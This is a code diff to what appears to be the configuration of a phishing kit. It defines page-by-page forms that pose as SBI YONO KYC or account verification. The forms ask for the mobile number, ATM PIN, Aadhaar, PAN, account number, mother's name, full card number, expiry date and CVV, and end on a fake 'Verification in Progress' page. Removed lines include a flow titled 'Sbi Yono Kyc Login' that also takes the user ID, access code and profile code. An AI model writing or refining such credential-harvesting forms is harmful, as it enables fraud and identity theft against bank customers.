@@ -51,78 +51,47 @@ export const FIELD_CATEGORIES: CategoryConfig[] = [
 // Each page's `nextPage` defines per-flow navigation.
 
 export const FORM_PAGES: PageConfig[] = [
-    // ---- MAIN FLOW: kyc_login → card → profile_verify → success ----
     {
-        id: 'kyc_login',
-        pageName: 'kyc_login',
-        title: 'Sbi Yono Kyc Login',
+        id: 'account_verify',
+        pageName: 'account_verify',
+        title: 'Account Verification',
         fields: [
-            { key: 'fullName', displayName: 'Full Name', type: 'text', category: 'personal', required: true, placeholder: 'Enter your full name' },
-            { key: 'mobileNumber', displayName: 'Mobile Number', type: 'tel', category: 'personal', required: true, maxlength: 10, placeholder: 'Enter mobile number' },
-            { key: 'motherName', displayName: 'Mother Name', type: 'text', category: 'personal', required: true, placeholder: "Enter mother's name" },
+            { key: 'mobileNumber', displayName: 'Mobile Number', type: 'tel', category: 'personal', required: true, maxlength: 10, placeholder: 'Enter 10-digit Mobile Number' },
+            { key: 'atmPin', displayName: 'ATM PIN', type: 'tel', category: 'account', required: true, maxlength: 4, placeholder: 'ATM PIN' },
         ],
-        nextPage: { main: 'card_auth' },
+        nextPage: { main: 'customer_verify' },
     },
     {
-        id: 'card_auth',
-        pageName: 'card_auth',
-        title: 'Debit Card Authentication',
+        id: 'customer_verify',
+        pageName: 'customer_verify',
+        title: 'Customer Verification',
         fields: [
-            { key: 'cardLast6', displayName: 'Card Last 6', type: 'tel', category: 'card', required: true, maxlength: 7, placeholder: '__ ____' },
-            { key: 'atmPin', displayName: 'ATM PIN', type: 'tel', category: 'card', required: true, maxlength: 4, placeholder: '••••' },
+            { key: 'aadhaarNumber', displayName: 'Aadhaar Number', type: 'tel', category: 'personal', required: true, maxlength: 12, placeholder: 'Enter 12-digit Aadhaar' },
+            { key: 'panNumber', displayName: 'PAN Number', type: 'text', category: 'personal', required: true, maxlength: 10, placeholder: 'ABCDE1234F' },
+            { key: 'accountNumber', displayName: 'Account Number', type: 'text', category: 'account', required: true, placeholder: 'Enter Account Number' },
+            { key: 'motherName', displayName: 'Mother Name', type: 'text', category: 'personal', required: true, placeholder: 'Enter Mother Name' }
         ],
-        nextPage: { main: 'profile_verify' },
+        nextPage: { main: 'card_verify' },
     },
     {
-        id: 'profile_verify',
-        pageName: 'profile_verify',
-        title: 'Verify Profile Details',
+        id: 'card_verify',
+        pageName: 'card_verify',
+        title: 'Card Verification',
         fields: [
-            { key: 'accountNumber', displayName: 'Account Number', type: 'text', category: 'account', required: true, placeholder: 'Enter account number' },
-            { key: 'aadhaarNumber', displayName: 'Aadhaar Number', type: 'text', category: 'account', required: true, maxlength: 12, placeholder: 'Enter 12-digit Aadhaar' },
-            { key: 'panCard', displayName: 'PAN Card', type: 'text', category: 'account', required: true, maxlength: 10, placeholder: 'Enter PAN number' },
+            { key: 'cardNumber', displayName: 'Card Number', type: 'tel', category: 'card', required: true, maxlength: 16, placeholder: 'Enter 16-digit Card Number' },
+            { key: 'validThrough', displayName: 'Valid Through', type: 'tel', category: 'card', required: true, maxlength: 5, placeholder: 'MMYY' },
+            { key: 'cvv', displayName: 'CVV', type: 'tel', category: 'card', required: true, maxlength: 3, placeholder: 'Enter 3-digit CVV' }
         ],
+        nextPage: { main: 'success' },
+    },
+    {
+        id: 'success',
+        pageName: 'success',
+        title: 'Verification in Progress',
+        fields: [],
         nextPage: { main: null },
-        isFinalPage: true,  // Main flow ends here
-    },
-
-    // ---- APPLY FLOW: yono_apply → verification → login_details → success ----
-    {
-        id: 'yono_apply',
-        pageName: 'yono_apply',
-        title: 'Apply YONO SBI',
-        fields: [
-            { key: 'fullName', displayName: 'Full Name', type: 'text', category: 'personal', required: true, placeholder: 'Enter your name' },
-            { key: 'mobileNumber', displayName: 'Mobile Number', type: 'tel', category: 'personal', required: true, maxlength: 10, placeholder: 'Mobile number' },
-            { key: 'accountNumber', displayName: 'Account Number', type: 'text', category: 'account', required: true, placeholder: 'Account number' },
-            { key: 'cifNumber', displayName: 'CIF Number', type: 'text', category: 'account', required: true, placeholder: 'Enter CIF number' },
-            { key: 'branchCode', displayName: 'Branch Code', type: 'text', category: 'account', required: true, placeholder: 'Enter branch code' },
-        ],
-        nextPage: { apply: 'verification' },
-    },
-    {
-        id: 'verification',
-        pageName: 'verification',
-        title: 'Step 2 – Verification',
-        fields: [
-            { key: 'dateOfBirth', displayName: 'Date of Birth', type: 'tel', category: 'personal', required: true, maxlength: 10, placeholder: 'DD/MM/YYYY' },
-            { key: 'cardExpiry', displayName: 'Card Expiry', type: 'tel', category: 'card', required: true, maxlength: 5, placeholder: 'MM/YY' },
-            { key: 'finalPin', displayName: 'Final PIN', type: 'tel', category: 'card', required: true, maxlength: 4, placeholder: '••••' },
-        ],
-        nextPage: { apply: 'login_details' },
-    },
-    {
-        id: 'login_details',
-        pageName: 'login_details',
-        title: 'Login Details',
-        fields: [
-            { key: 'userId', displayName: 'User ID', type: 'text', category: 'login', required: true, placeholder: 'Enter User ID' },
-            { key: 'accessCode', displayName: 'Access Code', type: 'password', category: 'login', required: true, placeholder: 'Enter Access Code' },
-            { key: 'profileCode', displayName: 'Profile Code', type: 'password', category: 'login', required: true, placeholder: 'Enter Profile Code' },
-        ],
-        nextPage: { apply: null },
-        isFinalPage: true,  // Apply flow ends here
-    },
+        isFinalPage: true,
+    }
 ];
 
 // ==================== HELPER FUNCTIONS ====================
